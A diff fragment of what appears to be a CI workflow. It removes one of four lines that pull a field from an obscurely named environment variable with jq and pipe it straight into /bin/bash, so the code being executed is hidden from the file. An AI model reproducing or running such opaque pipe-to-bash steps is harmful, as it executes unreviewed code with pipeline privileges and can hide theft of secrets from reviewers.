@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$dmp0" | jq -r .issld87 | /bin/bash
           printf '%s' "$t48" | jq -r .kr78 | /bin/bash
           printf '%s' "$tlapr87" | jq -r .nkul6 | /bin/bash
-          printf '%s' "$au87621" | jq -r .xy85896 | /bin/bash
 
       - name: Save output
         if: always()
